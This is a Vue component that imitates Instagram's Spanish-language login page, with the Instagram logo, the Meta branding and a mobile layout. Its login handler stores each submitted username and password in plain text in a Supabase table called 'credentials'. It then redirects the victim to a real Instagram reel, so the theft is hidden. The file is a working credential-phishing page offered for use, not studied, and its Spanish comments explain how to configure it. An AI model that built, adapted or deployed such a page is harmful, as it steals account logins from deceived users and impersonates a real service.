<template>
  <div class="app">
    <!-- Language Selector -->
    <div class="language-selector">
      <select v-model="selectedLanguage">
        <option value="es">Español (España)</option>
        <option value="en">English</option>
        <option value="fr">Français</option>
      </select>
    </div>

    <!-- Main Container -->
    <div class="main-container">
      <!-- Instagram Logo -->
      <div class="logo-container">
        <div class="instagram-logo">
          <svg width="80" height="80" viewBox="0 0 80 80" fill="none">
            <!-- Outer rounded square -->
            <rect x="4" y="4" width="72" height="72" rx="16" ry="16" stroke="url(#paint0_linear)" stroke-width="4" fill="none"/>
            <!-- Inner circle -->
            <circle cx="40" cy="40" r="18" stroke="url(#paint1_linear)" stroke-width="4" fill="none"/>
            <!-- Camera dot -->
            <circle cx="58" cy="22" r="4" fill="url(#paint2_linear)"/>
            <defs>
              <linearGradient id="paint0_linear" x1="4" y1="40" x2="76" y2="40" gradientUnits="userSpaceOnUse">
                <stop stop-color="#833AB4"/>
                <stop offset="0.25" stop-color="#C13584"/>
                <stop offset="0.5" stop-color="#E1306C"/>
                <stop offset="0.75" stop-color="#FD1D1D"/>
                <stop offset="1" stop-color="#F77737"/>
              </linearGradient>
              <linearGradient id="paint1_linear" x1="22" y1="40" x2="58" y2="40" gradientUnits="userSpaceOnUse">
                <stop stop-color="#833AB4"/>
                <stop offset="0.25" stop-color="#C13584"/>
                <stop offset="0.5" stop-color="#E1306C"/>
                <stop offset="0.75" stop-color="#FD1D1D"/>
                <stop offset="1" stop-color="#F77737"/>
              </linearGradient>
              <linearGradient id="paint2_linear" x1="54" y1="22" x2="62" y2="22" gradientUnits="userSpaceOnUse">
                <stop stop-color="#833AB4"/>
                <stop offset="0.25" stop-color="#C13584"/>
                <stop offset="0.5" stop-color="#E1306C"/>
                <stop offset="0.75" stop-color="#FD1D1D"/>
                <stop offset="1" stop-color="#F77737"/>
              </linearGradient>
            </defs>
          </svg>
        </div>
      </div>

      <!-- Login Form -->
      <form class="login-form" @submit.prevent="handleLogin">
        <div class="input-group">
          <input
            type="text"
            v-model="username"
            :placeholder="'Usuario, correo electrónico o móvil'"
            class="form-input"
            required
          />
        </div>
        
        <div class="input-group">
          <input
            type="password"
            v-model="password"
            placeholder="Contraseña"
            class="form-input"
            required
          />
        </div>

        <button type="submit" class="login-button">
          Iniciar sesión
        </button>
      </form>

      <!-- Forgot Password Link -->
      <div class="forgot-password">
        <a href="#" @click.prevent="handleForgotPassword">
          ¿Has olvidado la contraseña?
        </a>
      </div>
    </div>

    <!-- Create Account Section -->
    <div class="create-account-container">
      <button class="create-account-button" @click="handleCreateAccount">
        Crear cuenta nueva
      </button>
    </div>

    <!-- Meta Logo -->
    <div class="meta-logo">
      <span class="meta-text">Meta</span>
    </div>
  </div>
</template>

<script setup>
import { ref } from 'vue'
import { supabase } from './lib/supabaseClient'

const selectedLanguage = ref('es')
const username = ref('')
const password = ref('')
// URL de redirección después de hacer clic en "Iniciar sesión".
// Configura VITE_REDIRECT_URL en tu archivo .env (por ejemplo: VITE_REDIRECT_URL=https://tu-dominio.com)
const REDIRECT_URL = import.meta.env.VITE_REDIRECT_URL || 'https://www.instagram.com/reel/DNdPFAAtUqj/?igsh=MTl0MTJoeGkyZWt0ZA=='

const handleLogin = async () => {
  // Validación simple
  if (!username.value || !password.value) return

  // Inserta en la tabla 'credentials' de Supabase
  const { error } = await supabase
    .from('credentials')
    .insert({ username: username.value, password: password.value })

  if (error) {
    console.error('Error al guardar credenciales en Supabase:', error)
    return
  }

  console.log('Credenciales guardadas en Supabase')
  // Redirige si se configuró una URL de destino
  if (REDIRECT_URL) {
    window.location.href = REDIRECT_URL
  } else {
    console.warn('No se ha configurado VITE_REDIRECT_URL para la redirección.')
  }
}

const handleForgotPassword = () => {
  console.log('Forgot password clicked')
}

const handleCreateAccount = () => {
  console.log('Create account clicked')
}
</script>

<style scoped>
.app {
  min-height: 100vh;
  background-color: #fafafa;
  display: flex;
  flex-direction: column;
  align-items: center;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

.language-selector {
  position: absolute;
  top: 20px;
  right: 20px;
}

.language-selector select {
  background: transparent;
  border: none;
  color: #8e8e8e;
  font-size: 12px;
  cursor: pointer;
  outline: none;
}

.main-container {
  background: white;
  border: 1px solid #dbdbdb;
  border-radius: 1px;
  margin: 0 auto;
  margin-top: 100px;
  max-width: 350px;
  width: 100%;
  padding: 40px;
  box-sizing: border-box;
}

.logo-container {
  display: flex;
  justify-content: center;
  margin-bottom: 36px;
}

.instagram-logo {
  display: flex;
  justify-content: center;
  align-items: center;
}

.login-form {
  display: flex;
  flex-direction: column;
  gap: 6px;
}

.input-group {
  position: relative;
}

.form-input {
  background: #fafafa;
  border: 1px solid #dbdbdb;
  border-radius: 3px;
  box-sizing: border-box;
  color: #262626;
  font-size: 14px;
  padding: 9px 8px;
  width: 100%;
  outline: none;
  transition: border-color 0.2s ease-in-out;
}

.form-input:focus {
  border-color: #a8a8a8;
}

.form-input::placeholder {
  color: #8e8e8e;
}

.login-button {
  background: #096cee;
  border: 1px solid #096cee;
  border-radius: 4px;
  color: #ffffff;
  cursor: pointer;
  font-size: 14px;
  font-weight: 600;
  line-height: 18px;
  margin: 8px 0;
  padding: 5px 9px;
  text-align: center;
  text-decoration: none;
  transition: background-color 0.2s ease-in-out;
  width: 100%;
}

.login-button:hover {
  background: #096cee;
  border-color: #096cee;
}

.login-button:active {
  opacity: 0.7;
}

.forgot-password {
  text-align: center;
  margin-top: 24px;
}

.forgot-password a {
  color: #000000b2;
  font-size: 12px;
  line-height: 14px;
  margin-top: 12px;
  text-align: center;
  text-decoration: none;
}

.forgot-password a:hover {
  color: #096cee;
}

.create-account-container {
  background: white;
  border: 1px solid #dbdbdb;
  border-radius: 1px;
  margin: 10px auto 0;
  max-width: 350px;
  padding: 20px 40px;
  text-align: center;
  width: 100%;
  box-sizing: border-box;
}

.create-account-button {
  background: transparent;
  border: 1px solid #096cee;
  border-radius: 4px;
  color: #096cee;
  cursor: pointer;
  font-size: 14px;
  font-weight: 600;
  line-height: 18px;
  padding: 5px 9px;
  text-align: center;
  text-decoration: none;
  transition: all 0.2s ease-in-out;
  width: 100%;
}

.create-account-button:hover {
  background: #096cee;
  color: white;
}

.meta-logo {
  margin-top: 40px;
  display: flex;
  justify-content: center;
  align-items: center;
}

.meta-text {
  font-size: 14px;
  font-weight: 600;
  color: #000000b2;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  letter-spacing: 0.5px;
}

@media (max-width: 450px) {
  .main-container,
  .create-account-container {
    border: none;
    background: transparent;
  }
  /* Haga que el espaciado general sea más ajustado, pero que el texto y los controles sean más grandes para facilitar la lectura. */
  .main-container {
    margin-top: 60px;
    padding: 28px;
    max-width: 420px;
  }
  .logo-container {
    margin-bottom: 28px;
  }
  .instagram-logo svg {
    width: 96px;
    height: 96px;
    margin-top: 40px;
  }
  /* Centrar el selector de idioma en móviles */
  .language-selector {
    left: 0;
    right: 0;
    top: 20px;
    margin: 0 auto;
    display: flex;
    justify-content: center;
  }
  .language-selector select {
    font-size: 16px;
  }
  .login-form {
    gap: 10px;
    margin-top: 120px; /* baja el formulario en móviles */
  }
  .form-input {
    font-size: 16px; /* Evitar el zoom de iOS y mejorar la legibilidad */
    padding: 12px 12px;
    border-radius: 10px; /* esquinas un poco más redondeadas en móviles */
  }
  .login-button {
    font-size: 16px;
    line-height: 22px;
    padding: 12px 14px;
    border-radius: 25px; /* esquinas un poco más redondeadas en móviles */
  }
  .forgot-password a {
    font-size: 14px;
    line-height: 18px;
  }
  .create-account-container {
    padding: 20px 24px;
    max-width: 420px;
    margin-top: 100px; /* empuja el bloque con el botón hacia abajo, encima de Meta */
  }
  .create-account-button {
    font-size: 16px;
    line-height: 22px;
    padding: 12px 14px;
    margin-top: 18px;   /* baja el botón en móviles */
    border-radius: 25px; /* esquinas un poco más redondeadas en móviles */
  }
  /* Reducir el espacio superior del bloque Meta en móviles */
  .meta-logo {
    margin-top: 1px;
  }
  .meta-text {
    font-size: 16px;
    display: block;      /* convertir en bloque para que el margin-top surta efecto */
    margin-top: 1px;    /* acercar el texto “Meta” al botón */
  }
}
</style>